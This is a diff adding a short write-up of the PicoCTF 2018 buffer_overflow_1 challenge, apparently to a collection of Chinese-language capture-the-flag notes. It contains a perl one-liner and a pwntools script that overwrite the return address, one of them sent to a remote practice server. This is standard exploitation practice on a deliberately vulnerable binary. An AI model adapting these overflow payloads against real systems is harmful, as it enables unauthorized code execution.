@@ -330,3 +330,24 @@ add(p32(magic_addr), 8)
 put(0)
 p.interactive()
 ```
+### PicoCTF_2018_buffer_overflow_1
+
+```shell
+perl -e 'print "a"x(0x28+4) ."\xcb\x85\x04\x08"'|./PicoCTF_2018_buffer_overflow_1
+```
+
+缓冲区溢出的例子。不知道为什么perl输出定向到nc远程的时候会没有输出，最后还是用pwntools。
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+filename = './PicoCTF_2018_buffer_overflow_1'
+#p = process(filename)
+p = remote('node3.buuoj.cn', 29181)
+elf = ELF(filename)
+
+p.sendlineafter(b'string', b'a'*(0x28+4)+p32(0x80485cb))
+p.interactive()
+```
